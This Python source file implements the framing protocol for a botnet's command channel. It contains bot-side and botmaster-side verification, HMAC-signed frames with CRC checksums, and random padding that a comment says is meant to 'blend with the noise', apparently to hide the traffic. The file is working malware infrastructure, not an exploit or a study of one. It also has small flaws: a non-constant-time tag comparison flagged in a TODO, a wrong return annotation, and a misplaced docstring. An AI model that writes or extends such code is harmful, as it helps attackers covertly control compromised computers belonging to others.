from cryptography.hazmat.primitives import hashes, hmac
import os
import random
import struct
import zlib
from globvars import MAGIC_BYTES, PROTOCOL_VERSION, CMD_TYPES, RESP_TYPES

class ProtocolHandler:
    def __init__(self, secret: bytes):
        self.secret = secret

    def compute_auth_tag(self, session_key: bytes, payload: bytes) -> bytes:
        h = hmac.HMAC(session_key, hashes.SHA256())
        h.update(payload)
        return h.finalize()

    def build_frame(self, cmd_type, payload) -> dict:
        if not isinstance(payload, bytes):
            raise TypeError("Payload must be of type bytes.")
        
        auth = self.compute_auth_tag(self.secret, payload)
        checksum = zlib.crc32(payload) & 0xffffffff
        return struct.pack(
            f"!2s B B H 32s {len(payload)}s I",
            MAGIC_BYTES,
            PROTOCOL_VERSION,
            cmd_type,
            len(payload),
            auth,
            payload,
            checksum
        )

    def encode_frame(self, frame: bytes) -> bytes:
        # blend with the noise
        pad_after = random.randint(0, 16)
        suffix = os.urandom(pad_after)
        blend_frame = frame + suffix
        return blend_frame

    def decode_frame(self, data: bytes) -> tuple | None:
        magic_index = 0
        if len(data) < struct.calcsize("!2s B B H 32s"):
            return None
        try:
            header_size = struct.calcsize("!2s B B H 32s")
            header = data[magic_index:magic_index + header_size]
            (magic, version, cmd_type, length, auth) = struct.unpack("!2s B B H 32s", header)

            payload_start = magic_index + header_size
            payload_end = payload_start + length
            if payload_end + 4 > len(data):
                return None
            payload = data[payload_start:payload_end]
            checksum = struct.unpack("!I", data[payload_end:payload_end + 4])[0]
            return (magic, version, cmd_type, length, auth, payload, checksum) 
        except Exception as e:
            print(f"(Error)\t Failed to unpack frame: {e}")
            return None

    def verify_frame_bot_side(self, data: tuple) -> bool: 
        (magic, version, cmd_type, length, auth, payload, checksum) = data
        
        if magic != MAGIC_BYTES:
            print("(Error)\t Magic bytes mismatch")
            return False
        if not (cmd_type in CMD_TYPES.values()): 
            print(f"(Error)\t Command type mismatch ({cmd_type})")
            return False
        
        if version != PROTOCOL_VERSION:
            print("(Error)\t Version mismatch.")
            return False
        
        """Build a frame for the given command type and payload."""
        if zlib.crc32(payload) & 0xffffffff != checksum:
            print("(Error)\t Checksum mismatch.")
            return False
    
        # TODO
        # this leaks timing info! use constant-time comparison primitve instead
        expected_auth = self.compute_auth_tag(self.secret, payload)
        if auth != expected_auth:
            print("(Error)\t Authentication failed.")
            return False
        return True 

    def verify_frame_botmaster_side(self, data: tuple) -> bool: 
        (magic, version, cmd_type, length, auth, payload, checksum) = data
        
        if magic != MAGIC_BYTES:
            print("(Error)\t Magic bytes mismatch")
            return False

        if not (cmd_type in RESP_TYPES.values()): 
            print(f"(Error)\t Command type mismatch ({cmd_type})")
            return False
        
        if version != PROTOCOL_VERSION:
            print("(Error)\t Version mismatch.")
            return False
        
        if zlib.crc32(payload) & 0xffffffff != checksum:
            print("(Error)\t Checksum mismatch.")
            return False
    
        # TODO
        # this leaks timing info! use constant-time comparison primitve instead
        expected_auth = self.compute_auth_tag(self.secret, payload)
        if auth != expected_auth:
            print("(Error)\t Authentication failed.")
            return False
        return True 
    